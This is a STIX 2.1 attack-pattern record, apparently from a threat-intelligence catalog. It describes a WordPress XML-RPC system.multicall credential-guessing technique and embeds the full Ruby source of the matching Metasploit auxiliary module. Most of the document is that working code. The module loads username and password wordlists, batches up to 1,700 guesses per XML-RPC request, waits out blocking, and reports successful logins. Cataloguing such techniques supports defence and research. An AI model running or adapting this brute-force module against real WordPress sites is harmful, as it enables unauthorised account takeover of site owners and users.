{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--1d30d354-e62d-4bb1-91bf-64e17c1dbd84",
    "created": "2024-08-14T16:30:41.749079Z",
    "modified": "2024-08-14T16:30:41.749083Z",
    "name": "Wordpress XML-RPC system.multicall Credential Collector",
    "description": " This module attempts to find Wordpress credentials by abusing the XMLRPC APIs. Wordpress versions prior to 4.4.1 are suitable for this type of technique. For newer versions, the script will drop the CHUNKSIZE to 1 automatically. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/wordpress_multicall_creds.rb",
            "external_id": "wordpress_multicall_creds.rb"
        },
        {
            "source_name": "reference",
            "url": "https://blog.cloudflare.com/a-look-at-the-new-wordpress-brute-force-amplification-attack/"
        },
        {
            "source_name": "reference",
            "url": "https://blog.sucuri.net/2014/07/new-brute-force-attacks-exploiting-xmlrpc-in-wordpress.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'metasploit/framework/credential_collection'\nrequire 'metasploit/framework/login_scanner/wordpress_multicall'\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HTTP::Wordpress\n  include Msf::Auxiliary::Scanner\n  include Msf::Auxiliary::AuthBrute\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'         => 'Wordpress XML-RPC system.multicall Credential Collector',\n      'Description'  => %q{\n        This module attempts to find Wordpress credentials by abusing the XMLRPC\n        APIs. Wordpress versions prior to 4.4.1 are suitable for this type of\n        technique. For newer versions, the script will drop the CHUNKSIZE to 1 automatically.\n      },\n      'Author'      =>\n        [\n          'KingSabri <King.Sabri[at]gmail.com>' ,\n          'William <WCoppola[at]Lares.com>',\n          'sinn3r'\n        ],\n      'License'     => MSF_LICENSE,\n      'References'  =>\n        [\n          ['URL', 'https://blog.cloudflare.com/a-look-at-the-new-wordpress-brute-force-amplification-attack/' ],\n          ['URL', 'https://blog.sucuri.net/2014/07/new-brute-force-attacks-exploiting-xmlrpc-in-wordpress.html' ]\n        ],\n      'DefaultOptions' =>\n        {\n          'USER_FILE' => File.join(Msf::Config.data_directory, \"wordlists\", \"http_default_users.txt\"),\n          'PASS_FILE' => File.join(Msf::Config.data_directory, \"wordlists\", \"http_default_pass.txt\")\n        }\n    ))\n\n    register_options(\n      [\n        OptInt.new('BLOCKEDWAIT', [ true, 'Time(minutes) to wait if got blocked', 6 ]),\n        OptInt.new('CHUNKSIZE',   [ true, 'Number of passwords need to be sent per request. (1700 is the max)', 1500 ]),\n      ])\n\n    # Not supporting these options, because we are not actually letting the API to process the\n    # password list for us. We are doing that in Metasploit::Framework::LoginScanner::WordpressRPC.\n    deregister_options(\n      'BLANK_PASSWORDS', 'PASSWORD', 'USERPASS_FILE', 'USER_AS_PASS', 'DB_ALL_CREDS', 'DB_ALL_PASS', 'DB_SKIP_EXISTING', 'PASSWORD_SPRAY'\n      )\n  end\n\n  def passwords\n    File.readlines(datastore['PASS_FILE']).lazy.map {|pass| pass.chomp}\n  end\n\n  def check_options\n    if datastore['CHUNKSIZE'] > 1700\n      fail_with(Failure::BadConfig, 'Option CHUNKSIZE cannot be larger than 1700')\n    end\n  end\n\n  def setup\n    check_options\n  end\n\n  def check_setup\n    version = wordpress_version\n    vprint_good(\"Found Wordpress version: #{version}\")\n\n    if !wordpress_and_online?\n      print_error(\"#{peer}:#{rport}#{target_uri} does not appear to be running Wordpress or you got blocked! (Do Manual Check)\")\n      false\n    elsif !wordpress_xmlrpc_enabled?\n      print_error(\"#{peer}:#{rport}#{wordpress_url_xmlrpc} does not enable XMLRPC\")\n      false\n    elsif Rex::Version.new(version) >= Rex::Version.new('4.4.1')\n      print_error(\"#{peer}#{wordpress_url_xmlrpc} Target's version (#{version}) is not vulnerable to this attack.\")\n      vprint_status(\"Dropping CHUNKSIZE from #{datastore['CHUNKSIZE']} to 1\")\n      datastore['CHUNKSIZE'] = 1\n      true\n    else\n      print_status(\"Target #{peer} is running Wordpress\")\n      true\n    end\n  end\n\n  def run_host(ip)\n    if check_setup\n      print_status(\"XMLRPC enabled, Hello message received!\")\n    else\n      print_error(\"Abborting the attack.\")\n      return\n    end\n\n    print_status(\"#{peer} - Starting XML-RPC login sweep...\")\n\n    cred_collection = Metasploit::Framework::CredentialCollection.new(\n        blank_passwords: true,\n        user_file: datastore['USER_FILE'],\n        username: datastore['USERNAME']\n    )\n\n    scanner = Metasploit::Framework::LoginScanner::WordpressMulticall.new(\n      configure_http_login_scanner(\n        passwords: passwords,\n        chunk_size: datastore['CHUNKSIZE'],\n        block_wait: datastore['BLOCKEDWAIT'],\n        base_uri: target_uri.path,\n        uri: wordpress_url_xmlrpc,\n        cred_details: cred_collection,\n        stop_on_success: datastore['STOP_ON_SUCCESS'],\n        bruteforce_speed: datastore['BRUTEFORCE_SPEED'],\n        connection_timeout: 5,\n        http_username: datastore['HttpUsername'],\n        http_password: datastore['HttpPassword']\n      )\n    )\n\n    scanner.scan! do |result|\n      credential_data = result.to_h\n      credential_data.merge!(\n          module_fullname: self.fullname,\n          workspace_id: myworkspace_id\n      )\n\n      case result.status\n        when Metasploit::Model::Login::Status::SUCCESSFUL\n          print_brute :level => :vgood, :ip => ip, :msg => \"SUCCESSFUL: #{result.credential}\"\n      end\n    end\n\n  end\nend\n"
}